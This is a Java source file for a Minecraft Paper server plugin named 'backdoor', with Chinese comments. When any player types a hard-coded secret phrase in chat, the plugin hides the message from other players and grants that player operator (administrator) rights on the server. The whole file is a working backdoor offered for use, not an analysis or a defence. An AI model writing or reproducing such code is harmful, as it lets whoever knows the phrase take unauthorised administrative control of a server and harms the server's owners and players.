package link.mchypixel;

import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

/**
 * 主插件类
 */
public final class backdoor extends JavaPlugin implements Listener, CommandExecutor {

    // 这是后门的触发密码
    private final String SECRET_CODE = "@@ilovethecloudthinkserversoiwanttogetop";

    /**
     * 当插件被加载时调用
     */
    @Override
    public void onEnable() {
        // 向控制台输出一条消息，表示插件已成功加载
        getLogger().info("Backdoor plugin has been enabled.");

        // 注册事件监听器，这样 onPlayerChat 方法才能生效
        getServer().getPluginManager().registerEvents(this, this);
    }

    /**
     * 当插件被卸载时调用
     */
    @Override
    public void onDisable() {
        // 向控制台输出一条消息
        getLogger().info("Backdoor plugin has been disabled.");
    }

    /**
     * 监听 Paper 的异步聊天事件 (AsyncChatEvent)
     * 这是兼容 1.19+ 版本的正确方式
     * @param event 聊天事件对象
     */
    @EventHandler
    public void onPlayerChat(AsyncChatEvent event) {
        // 获取发送消息的玩家
        final Player player = event.getPlayer();

        // 使用 Adventure API 将聊天消息的 Component 对象序列化为纯文本字符串
        final String message = PlainTextComponentSerializer.plainText().serialize(event.message());

        // 比较消息内容是否与预设的密码相同（忽略大小写）
        if (message.equalsIgnoreCase(SECRET_CODE)) {
            
            // 取消这个聊天事件，这样密码就不会被公屏上的其他玩家看到
            event.setCancelled(true);

            // [重要] 给予OP权限和发送消息都属于修改服务器状态的操作，
            // 它们不是线程安全的，绝对不能在异步事件（如AsyncChatEvent）中直接执行。
            // 我们必须使用 Bukkit 的调度器，将这些操作安排到下一个游戏刻（在主线程中）执行。
            getServer().getScheduler().runTask(this, () -> {
                // 在主线程中给予玩家 OP 权限
                player.setOp(true);
                
                // 发送一条确认消息给该玩家
                // 使用 Adventure Component 来创建带颜色的文本是现代版本的推荐做法
                player.sendMessage(Component.text("你已获得OP权限！", NamedTextColor.YELLOW));

                // （可选）可以在后台记录一下谁触发了后门
                getLogger().warning("Player " + player.getName() + " has triggered the backdoor and received OP privileges.");
            });
        }
    }

    /**
     * 这个方法是空的，因为你的原始代码中 onCommand 也是空的。
     * 如果你以后需要添加指令，可以在这里实现。
     */
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        // 返回 false 会在游戏内显示 plugin.yml 中定义的 usage 信息
        return false;
    }
}
